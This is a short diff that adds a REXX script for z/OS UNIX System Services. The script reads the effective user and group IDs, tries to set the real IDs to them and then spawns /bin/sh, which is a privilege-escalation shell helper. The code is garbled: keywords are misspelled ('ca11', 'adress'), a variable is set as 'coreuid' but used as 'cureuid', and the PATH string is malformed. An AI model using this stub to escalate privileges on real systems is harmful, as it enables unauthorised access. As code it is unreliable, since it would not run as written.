@@ -1,0 +1,18 @@
+/* REXX */
+ca11 syscalls 'ON'
+adress syscall 'geteuid'
+coreuid=retval
+adress syscall 'getegid'
+curegid=retval
+say 'euid:' coreuid 'egid:' curegid
+address syscall 'setuid ' cureuid
+address syscall 'setgid ' curegid
+adress syscall 'getuid'
+say 'euid:' retval
+address syscall 'getgid'
+say 'gid:' retval
+env.0=1
+env.1='PATH=/bin:/sbin/usr/sbin:/usr/bin'
+call bpxwunix '/bin/sh',,,,env.
+
+
